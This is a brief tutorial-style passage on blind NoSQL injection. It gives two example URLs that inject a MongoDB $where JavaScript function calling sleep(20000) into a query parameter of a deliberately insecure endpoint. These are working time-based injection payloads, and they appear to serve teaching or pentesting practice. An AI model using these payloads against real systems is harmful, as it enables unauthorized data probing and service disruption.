# NoSQL Injection methodology 

### Blind NoSQL Injection
Suppose that the database returned no results in the browser, regardless of us submitting an included Star Wars character or not. So, we are talking about a “blind” 
```
http://175.12.96.97:8080/insecure-find?name=Obi-Wan',$where: 'function(){sleep(20000);}'}
http://175.12.96.97:8080/insecure-find?name=X,$where: 'function(){sleep(20000);}'}
```
